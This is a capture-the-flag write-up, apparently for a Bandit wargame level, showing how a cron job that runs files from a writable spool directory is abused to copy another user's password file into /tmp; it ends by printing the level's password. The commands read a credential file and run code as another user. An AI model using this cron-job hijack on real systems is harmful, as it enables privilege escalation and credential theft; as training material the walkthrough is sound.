
---
### 🧩 Challenge Description

> A **cronjob** is running every minute on the server as user `bandit23`.  
> It executes a script that **looks in a specific directory** for new files, executes them, and deletes them afterward.

> Your task is to **place a script** in that directory which **outputs the password** for Bandit23 into a file you can read.

---

### 🧪 Solution Strategy

1. **View the cron job:**
    
    ```bash
    cat /etc/cron.d/cronjob_bandit23
    ```
    
    Output:
    
    ```
    * * * * * bandit23 /usr/bin/cronjob_bandit23.sh
    ```
    
2. **Read the cronjob script:**
    
    ```bash
    cat /usr/bin/cronjob_bandit23.sh
    ```
    
    Output:
    
    ```bash
    #!/bin/bash
    for i in /var/spool/bandit22/*; do
        bash "$i" 2>/dev/null
        rm -f "$i"
    done
    ```
    
3. **Create a script inside `/var/spool/bandit22/`:**
    
    ```bash
    echo 'cat /etc/bandit_pass/bandit23 > /tmp/shaunpass' > /var/spool/bandit22/my_script.sh
    chmod +x /var/spool/bandit22/my_script.sh
    ```
    
4. **Wait 1 minute**, then read the output:
    
    ```bash
    cat /tmp/shaunpass
    ```
    

---

### ✅ Commands Used

```bash
echo 'cat /etc/bandit_pass/bandit23 > /tmp/shaunpass' > /var/spool/bandit22/my_script.sh
chmod +x /var/spool/bandit22/my_script.sh
cat /tmp/shaunpass
```

---

### 🔑 Password for Bandit23

```
jbYICExggBDSA5XESyphPTQ9L7ZgWn1i
```

---
